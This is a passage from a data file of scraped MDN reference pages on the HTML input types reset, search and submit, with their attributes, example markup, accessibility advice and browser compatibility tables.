properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/range](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/range)"
- name: input type="reset"
  summary: <input> elements of type reset are rendered as buttons, with a default click event handler that resets all inputs in the form to their initial values
  description: "# \\<input type=\"reset\"\\>\n\n[`<input>`](../input) elements of type `reset` are rendered as buttons, with a default [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event handler that resets all inputs in the form to their initial values.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"reset\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <form>\n      <div class=\"controls\">\n        <label for=\"id\">User ID:</label>\n        <input type=\"text\" id=\"id\" name=\"id\" />\n\n        <input type=\"reset\" value=\"Reset\" />\n        <input type=\"submit\" value=\"Submit\" />\n      </div>\n    </form>\n\n    .controls {\n      padding-top: 1rem;\n      display: grid;\n      grid-template-rows: repeat(3, 1fr);\n      grid-template-columns: 1fr 2fr;\n      gap: 0.7rem;\n    }\n\n    label {\n      font-size: 0.8rem;\n      justify-self: end;\n    }\n\n    input[type='reset'],\n    input[type='submit'] {\n      width: 5rem;\n      justify-self: end;\n    }\n\n    input[type='reset'] {\n      grid-column: 2;\n      grid-row: 2;\n    }\n\n    input[type='submit'] {\n      grid-column: 2;\n      grid-row: 3;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** You should usually avoid including reset buttons in your forms. They're rarely useful, and are instead more likely to frustrate users who click them by mistake (often while trying to click the [submit button](submit)).\n\n## Value\n\nAn `<input type=\"reset\">` element's [`value`](../input#value) attribute contains a string that is used as the button's label providing the button with an [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description). Buttons such as `reset` don't have a value otherwise.\n\n### Setting the value attribute\n\nhtml\n\n```\n<input type=\"reset\" value=\"Reset the form\" />\n```\n\n### Omitting the value attribute\n\nIf you don't specify a `value`, you get a button with the default label (typically \"Reset,\" but this will vary depending on the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent)):\n\nhtml\n\n```\n<input type=\"reset\" />\n```\n\n## Using reset buttons\n\n`<input type=\"reset\">` buttons are used to reset forms. If you want to create a custom button and then customize the behavior using JavaScript, you need to use [`<input type=\"button\">`](button), or better still, a [`<button>`](../button) element.\n\n### A simple reset button\n\nWe'll begin by creating a simple reset button:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"example\">Type in some sample text</label>\n    <input id=\"example\" type=\"text\" />\n  </div>\n  <div>\n    <input type=\"reset\" value=\"Reset the form\" />\n  </div>\n</form>\n```\n\nThis renders like so:\n\nTry entering some text into the text field, and then pressing the reset button.\n\n### Adding a reset keyboard shortcut\n\nTo add a keyboard shortcut to a reset button — just as you would with any [`<input>`](../input) for which it makes sense — you use the [`accesskey`](../../global_attributes#accesskey) global attribute.\n\nIn this example, r is specified as the access key (you'll need to press r plus the particular modifier keys for your browser/OS combination; see [`accesskey`](../../global_attributes#accesskey) for a useful list of those).\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"example\">Type in some sample text</label>\n    <input id=\"example\" type=\"text\" />\n  </div>\n  <div>\n    <input type=\"reset\" value=\"Reset the form\" accesskey=\"r\" />\n  </div>\n</form>\n```\n\nThe problem with the above example is that there's no way for the user to know what the access key is! This is especially true since the modifiers are typically non-standard to avoid conflicts. When building a site, be sure to provide this information in a way that doesn't interfere with the site design (for example by providing an easily accessible link that points to information on what the site access keys are). Adding a tooltip to the button (using the [`title`](../../global_attributes#title) attribute) can also help, although it's not a complete solution for accessibility purposes.\n\n### Disabling and enabling a reset button\n\nTo disable a reset button, specify the [`disabled`](../input#disabled) attribute on it, like so:\n\nhtml\n\n```\n<input type=\"reset\" value=\"Disabled\" disabled />\n```\n\nYou can enable and disable buttons at run time by setting `disabled` to `true` or `false`; in JavaScript this looks like `btn.disabled = true` or `btn.disabled = false`.\n\n**Note:** See the [`<input type=\"button\">`](button#disabling_and_enabling_a_button) page for more ideas about enabling and disabling buttons.\n\n## Validation\n\nButtons don't participate in constraint validation; they have no real value to be constrained.\n\n## Examples\n\nWe've included simple examples above. There isn't really anything more to say about reset buttons.\n\n## Technical summary\n\n|                                 |                                                                                               |\n|---------------------------------|-----------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string used as the button's label                                                           |\n| **Events**                      | [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event)               |\n| **Supported common attributes** | [`type`](../input#type) and [`value`](../input#value)                                         |\n| **IDL attributes**              | `value`                                                                                       |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)       |\n| **Methods**                     | None                                                                                          |\n| **Implicit ARIA Role**          | [`button`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface which implements it.\n- [Forms and buttons](https://developer.mozilla.org/en-US/docs/Learn/Forms/Basic_native_form_controls#actual_buttons)\n- [HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- The [`<button>`](../button) element\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/reset](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/reset)"
- name: input type="search"
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<input type=\"search\"\\>\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Finput%2Fsearch&level=high)\n\n[`<input>`](../input) elements of type `search` are text fields designed for the user to enter search queries into. These are functionally identical to [`text`](text) inputs, but may be styled differently by the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent).\n\n## Try it\n\n#### HTML Demo: \\<input type=\"search\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"site-search\">Search the site:</label>\n    <input type=\"search\" id=\"site-search\" name=\"q\" />\n\n    <button>Search</button>\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nThe [`value`](../input#value) attribute contains a string representing the value contained in the search field. You can retrieve this using the [`HTMLInputElement.value`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement#value) property in JavaScript.\n\njs\n\n```\nsearchTerms = mySearch.value;\n```\n\nIf no validation constraints are in place for the input (see [Validation](#validation) for more details), the value can be any text string or an empty string (`\"\"`).\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, search field inputs support the following attributes.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### maxlength\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the search field. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the search field has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### minlength\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the search field. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the search input has no minimum length.\n\nThe search field will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### pattern\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nSee the section [Specifying a pattern](#specifying_a_pattern) for details and an example.\n\n### placeholder\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### size\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n### spellcheck\n\n[`spellcheck`](../../global_attributes#spellcheck) is a global attribute that is used to indicate whether to enable spell-checking for an element. It can be used on any editable content, but here we consider specifics related to the use of `spellcheck` on [`<input>`](../input) elements. The permitted values for `spellcheck` are:\n\n[`false`](#false)  \nDisable spell-checking for this element.\n\n[`true`](#true)  \nEnable spell-checking for this element.\n\n[\"\" (empty string) or no value](#_empty_string_or_no_value)  \nFollow the element's default behavior for spell-checking. This may be based upon a parent's `spellcheck` setting or other factors.\n\nAn input field can have spell-checking enabled if it doesn't have the [readonly](#readonly) attribute set and is not disabled.\n\nThe value returned by reading `spellcheck` may not reflect the actual state of spell-checking within a control, if the [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) preferences override the setting.\n\n## Non-standard attributes\n\nThe following non-standard attributes are available to search input fields. As a general rule, you should avoid using them unless it can't be helped.\n\n### autocorrect\n\nA Safari extension, the `autocorrect` attribute is a string which indicates whether to activate automatic correction while the user is editing this field. Permitted values are:\n\n[`on`](#on)  \nEnable automatic correction of typos, as well as processing of text substitutions if any are configured.\n\n[`off`](#off)  \nDisable automatic correction and text substitutions.\n\n### incremental\n\nThe Boolean attribute `incremental` is a WebKit and Blink extension (so supported by Safari, Opera, Chrome, etc.) which, if present, tells the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) to process the input as a live search. As the user edits the value of the field, the user agent sends [`search`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/search_event) events to the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) object representing the search box. This allows your code to update the search results in real time as the user edits the search.\n\nIf `incremental` is not specified, the [`search`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/search_event) event is only sent when the user explicitly initiates a search (such as by pressing the Enter or Return key while editing the field).\n\nThe `search` event is rate-limited so that it is not sent more frequently than an implementation-defined interval.\n\n### results\n\nThe `results` attribute—supported only by Safari—is a numeric value that lets you override the maximum number of entries to be displayed in the [`<input>`](../input) element's natively-provided drop-down menu of previous search queries.\n\nThe value must be a non-negative decimal number. If not provided, or an invalid value is given, the browser's default maximum number of entries is used.\n\n## Using search inputs\n\n`<input>` elements of type `search` are very similar to those of type `text`, except that they are specifically intended for handling search terms. They are basically equivalent in behavior, but user agents may choose to style them differently by default (and, of course, sites may use stylesheets to apply custom styles to them).\n\n### Basic example\n\nhtml\n\n```\n<form>\n  <div>\n    <input type=\"search\" id=\"mySearch\" name=\"q\" />\n    <button>Search</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\n`q` is the most common `name` given to search inputs, although it's not mandatory. When submitted, the data name/value pair sent to the server will be `q=searchterm`.\n\n**Note:** You must remember to set a [`name`](../input#name) for your input, otherwise nothing will be submitted.\n\n### Differences between search and text types\n\nThe main basic differences come in the way browsers handle them. The first thing to note is that some browsers show a cross icon that can be clicked on to remove the search term instantly if desired, in Chrome this action is also triggered when pressing escape. The following screenshot comes from Chrome:\n\nIn addition, modern browsers also tend to automatically store search terms previously entered across domains, which then come up as autocomplete options when subsequent searches are performed in search inputs on that domain. This helps users who tend to do searches on the same or similar search queries over time. This screenshot is from Firefox:\n\nAt this point, let's look at some useful techniques you can apply to your search forms.\n\n### Setting placeholders\n\nYou can provide a useful placeholder inside your search input that could give a hint on what to do using the [`placeholder`](../input#placeholder) attribute. Look at the following example:\n\nhtml\n\n```\n<form>\n  <div>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"Search the site…\" />\n    <button>Search</button>\n  </div>\n</form>\n```\n\nYou can see how the placeholder is rendered below:\n\n### Search form labels and accessibility\n\nOne problem with search forms is their accessibility; a common design practice is not to provide a label for the search field (although there might be a magnifying glass icon or similar), as the purpose of a search form is normally fairly obvious for sighted users due to placement ([this example shows a typical pattern](https://mdn.github.io/learning-area/accessibility/aria/website-aria-roles/)).\n\nThis could, however, cause confusion for screen reader users, since they will not have any verbal indication of what the search input is. One way around this that won't impact on your visual design is to use [WAI-ARIA](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/WAI-ARIA_basics) features:\n\n- A `role` attribute of value `search` on the `<form>` element will cause screen readers to announce that the form is a search form.\n- If that isn't enough, you can use an [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) attribute on the [`<input>`](../input) itself. This should be a descriptive text label that will be read out by the screen reader; it's used as a non-visual equivalent to `<label>`.\n\nLet's have a look at an example:\n\nhtml\n\n```\n<form role=\"search\">\n  <div>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"Search the site…\"\n      aria-label=\"Search through site content\" />\n    <button>Search</button>\n  </div>\n</form>\n```\n\nYou can see how this is rendered below:\n\nThere is no visual difference from the previous example, but screen reader users have way more information available to them.\n\n**Note:** See [Signposts/Landmarks](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/WAI-ARIA_basics#signpostslandmarks) for more information about such accessibility features.\n\n### Physical input element size\n\nThe physical size of the input box can be controlled using the [`size`](../input#size) attribute. With it, you can specify the number of characters the input box can display at a time. In this example, for instance, the search box is 30 characters wide:\n\nhtml\n\n```\n<form>\n  <div>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"Search the site…\"\n      size=\"30\" />\n    <button>Search</button>\n  </div>\n</form>\n```\n\nThe result is this wider input box:\n\n## Validation\n\n`<input>` elements of type `search` have the same validation features available to them as regular `text` inputs. It is less likely that you'd want to use validation features in general for search boxes. In many cases, users should just be allowed to search for anything, but there are a few cases to consider, such as searches against data of a known format.\n\n**Note:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data (or data which is too large, is of the wrong type, and so forth) is entered into your database.\n\n### A note on styling\n\nThere are useful pseudo-classes available for styling valid/invalid form elements: [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid). In this section, we'll use the following CSS, which will place a check (tick) next to inputs containing valid values, and a cross next to inputs containing invalid values.\n\ncss\n\n```\ninput:invalid ~ span::after {\n  content: \"✖\";\n  padding-left: 5px;\n  position: absolute;\n}\n\ninput:valid ~ span::after {\n  content: \"✓\";\n  padding-left: 5px;\n  position: absolute;\n}\n```\n\nThe technique also requires a [`<span>`](../span) element to be placed after the form element, which acts as a holder for the icons. This was necessary because some input types on some browsers don't display icons placed directly after them very well.\n\n### Making input required\n\nYou can use the [`required`](../input#required) attribute as an easy way of making entering a value required before form submission is allowed:\n\nhtml\n\n```\n<form>\n  <div>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"Search the site…\"\n      required />\n    <button>Search</button>\n    <span class=\"validity\"></span>\n  </div>\n</form>\n```\n\nThis renders like so:\n\nIn addition, if you try to submit the form with no search term entered into it, the browser will show a message. The following example is from Firefox:\n\nDifferent messages will be shown when you try to submit the form with different types of invalid data contained inside the inputs; see the below examples.\n\n### Input value length\n\nYou can specify a minimum length, in characters, for the entered value using the [`minlength`](../input#minlength) attribute; similarly, use [`maxlength`](../input#maxlength) to set the maximum length of the entered value.\n\nThe example below requires that the entered value be 4–8 characters in length.\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"mySearch\">Search for user</label>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"User IDs are 4–8 characters in length\"\n      required\n      size=\"30\"\n      minlength=\"4\"\n      maxlength=\"8\" />\n    <button>Search</button>\n    <span class=\"validity\"></span>\n  </div>\n</form>\n```\n\nThis renders like so:\n\nIf you try to submit the form with less than 4 characters, you'll be given an appropriate error message (which differs between browsers). If you try to go beyond 8 characters in length, the browser won't let you.\n\n### Specifying a pattern\n\nYou can use the [`pattern`](../input#pattern) attribute to specify a regular expression that the inputted value must follow to be considered valid (see [Validating against a regular expression](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation#validating_against_a_regular_expression) for a simple crash course).\n\nLet's look at an example. Say we wanted to provide a product ID search form, and the IDs were all codes of two letters followed by four numbers. The following example covers it:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"mySearch\">Search for product by ID:</label>\n    <input\n      type=\"search\"\n      id=\"mySearch\"\n      name=\"q\"\n      placeholder=\"two letters followed by four numbers\"\n      required\n      size=\"30\"\n      pattern=\"[A-z]{2}[0-9]{4}\" />\n    <button>Search</button>\n    <span class=\"validity\"></span>\n  </div>\n</form>\n```\n\nThis renders like so:\n\n## Examples\n\nYou can see a good example of a search form used in context at our [website-aria-roles](https://github.com/mdn/learning-area/tree/main/accessibility/aria/website-aria-roles) example ([see it live](https://mdn.github.io/learning-area/accessibility/aria/website-aria-roles/)).\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                                           |                                                                                                                          |\n|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the value contained in the search field.                                                                                                                                                                                                                                            |                                                                                                                          |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                                                 |                                                                                                                          |\n| **Supported Common Attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`maxlength`](../input#maxlength), [`minlength`](../input#minlength), [`pattern`](../input#pattern), [`placeholder`](../input#placeholder), [`required`](../input#required), [`size`](../input#size).                                   |                                                                                                                          |\n| **IDL attributes**              | `value`                                                                                                                                                                                                                                                                                                   |                                                                                                                          |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                                   |                                                                                                                          |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText), [`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange). |                                                                                                                          |\n| **Implicit ARIA Role**          | with no `list` attribute: [`searchbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/searchbox_role)                                                                                                                                                                             | with `list` attribute: [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `search` | 5       | 12   | 4       | 10.6  | 5      | 18             | 4                   | 14            | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- [HTML Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface it's based upon\n- [`<input type=\"text\">`](text)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/search](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/search)"
- name: input type="submit"
  summary: <input> elements of type submit are rendered as buttons
  description: "# \\<input type=\"submit\"\\>\n\n[`<input>`](../input) elements of type `submit` are rendered as buttons. When the [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event occurs (typically because the user clicked the button), the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) attempts to submit the form to the server.\n\n## Value\n\nAn `<input type=\"submit\">` element's [`value`](../input#value) attribute contains a string which is displayed as the button's label. Buttons do not have a true value otherwise. The `value` provides the [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description) for the button.\n\n### Setting the value attribute\n\nhtml\n\n```\n<input type=\"submit\" value=\"Send Request\" />\n```\n\n### Omitting the value attribute\n\nIf you don't specify a `value`, the button will have a default label, chosen by the user agent. This label is likely to be something along the lines of \"Submit\" or \"Submit Query.\" Here's an example of a submit button with a default label in your browser:\n\nhtml\n\n```\n<input type=\"submit\" />\n```\n\n## Additional attributes\n\nIn addition to the attributes shared by all [`<input>`](../input) elements, `submit` button inputs support the following attributes.\n\n### formaction\n\nA string indicating the URL to which to submit the data. This takes precedence over the [`action`](../form#action) attribute on the [`<form>`](../form) element that owns the [`<input>`](../input).\n\nThis attribute is also available on [`<input type=\"image\">`](image) and [`<button>`](../button) elements.\n\n### formenctype\n\nA string that identifies the encoding method to use when submitting the form data to the server. There are three permitted values:\n\n[`application/x-www-form-urlencoded`](#applicationx-www-form-urlencoded)  \nThis, the default value, sends the form data as a string after [percent-encoding](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) the text using an algorithm such as [`encodeURI()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI).\n\n[`multipart/form-data`](#multipartform-data)  \nUses the [`FormData`](https://developer.mozilla.org/en-US/docs/Web/API/FormData) API to manage the data, allowing for files to be submitted to the server. You *must* use this encoding type if your form includes any [`<input>`](../input) elements of [`type`](../input#type) `file` ([`<input type=\"file\">`](file)).\n\n[`text/plain`](#textplain)  \nPlain text; mostly useful only for debugging, so you can easily see the data that's to be submitted.\n\nIf specified, the value of the `formenctype` attribute overrides the owning form's [`action`](../form#action) attribute.\n\nThis attribute is also available on [`<input type=\"image\">`](image) and [`<button>`](../button) elements.\n\n### formmethod\n\nA string indicating the HTTP method to use when submitting the form's data; this value overrides any [`method`](../form#method) attribute given on the owning form. Permitted values are:\n\n[`get`](#get)  \nA URL is constructed by starting with the URL given by the `formaction` or [`action`](../form#action) attribute, appending a question mark (\"?\") character, then appending the form's data, encoded as described by `formenctype` or the form's [`enctype`](../form#enctype) attribute. This URL is then sent to the server using an HTTP [`get`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) request. This method works well for simple forms that contain only [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII) characters and have no side effects. This is the default value.\n\n[`post`](#post)  \nThe form's data is included in the body of the request that is sent to the URL given by the `formaction` or [`action`](../form#action) attribute using an HTTP [`post`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) method. This method supports complex data and file attachments.\n\n[`dialog`](#dialog)  \nThis method is used to indicate that the button closes the dialog with which the input is associated, and does not transmit the form data at all.\n\nThis attribute is also available on [`<input type=\"image\">`](image) and [`<button>`](../button) elements.\n\n### formnovalidate\n\nA Boolean attribute which, if present, specifies that the form should not be validated before submission to the server. This overrides the value of the [`novalidate`](../form#novalidate) attribute on the element's owning form.\n\nThis attribute is also available on [`<input type=\"image\">`](image) and [`<button>`](../button) elements.\n\n### formtarget\n\nA string which specifies a name or keyword that indicates where to display the response received after submitting the form. The string must be the name of a **browsing context** (that is, a tab, window, or [`<iframe>`](../iframe)). A value specified here overrides any target given by the [`target`](../form#target) attribute on the [`<form>`](../form) that owns this input.\n\nIn addition to the actual names of tabs, windows, or inline frames, there are a few special keywords that can be used:\n\n[`_self`](#_self)  \nLoads the response into the same browsing context as the one that contains the form. This will replace the current document with the received data. This is the default value used if none is specified.\n\n[`_blank`](#_blank)  \nLoads the response into a new, unnamed, browsing context. This is typically a new tab in the same window as the current document, but may differ depending on the configuration of the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent).\n\n[`_parent`](#_parent)  \nLoads the response into the parent browsing context of the current one. If there is no parent context, this behaves the same as `_self`.\n\n[`_top`](#_top)  \nLoads the response into the top-level browsing context; this is the browsing context that is the topmost ancestor of the current context. If the current context is the topmost context, this behaves the same as `_self`.\n\nThis attribute is also available on [`<input type=\"image\">`](image) and [`<button>`](../button) elements.\n\n## Using submit buttons\n\n`<input type=\"submit\">` buttons are used to submit forms. If you want to create a custom button and then customize the behavior using JavaScript, you need to use [`<input type=\"button\">`](button), or better still, a [`<button>`](../button) element.\n\nIf you choose to use `<button>` elements to create the buttons in your form, keep this in mind: If the `<button>` is inside a [`<form>`](../form), that button will be treated as the \"submit\" button. So you should be in the habit of expressly specifying which button is the submit button.\n\n### A simple submit button\n\nWe'll begin by creating a form with a simple submit button:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"example\">Let's submit some text</label>\n    <input id=\"example\" type=\"text\" name=\"text\" />\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Send\" />\n  </div>\n</form>\n```\n\nThis renders like so:\n\nTry entering some text into the text field, and then submitting the form.\n\nUpon submitting, the data name/value pair gets sent to the server. In this instance, the string will be `text=usertext`, where \"usertext\" is the text entered by the user, encoded to preserve special characters. Where and how the data is submitted depends on the configuration of the `<form>`; see [Sending form data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data) for more details.\n\n### Adding a keyboard shortcut to a submit button\n\nKeyboard shortcuts, also known as access keys and keyboard equivalents, let the user trigger a button using a key or combination of keys on the keyboard. To add a keyboard shortcut to a submit button — just as you would with any [`<input>`](../input) for which it makes sense — you use the [`accesskey`](../../global_attributes/accesskey) global attribute.\n\nIn this example, s is specified as the access key (you'll need to press s plus the particular modifier keys for your browser/OS combination). In order to avoid conflicts with the user agent's own keyboard shortcuts, different modifier keys are used for access keys than for other shortcuts on the host computer. See [`accesskey`](../../global_attributes/accesskey) for further details.\n\nHere's the previous example with the s access key added:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"example\">Let's submit some text</label>\n    <input id=\"example\" type=\"text\" name=\"text\" />\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Send\" accesskey=\"s\" />\n  </div>\n</form>\n```\n\nFor example, in Firefox for Mac, pressing Control-Option-S triggers the Send button, while Chrome on Windows uses Alt+S.\n\nThe problem with the above example is that the user will not know what the access key is! This is especially true since the modifiers are typically non-standard to avoid conflicts. When building a site, be 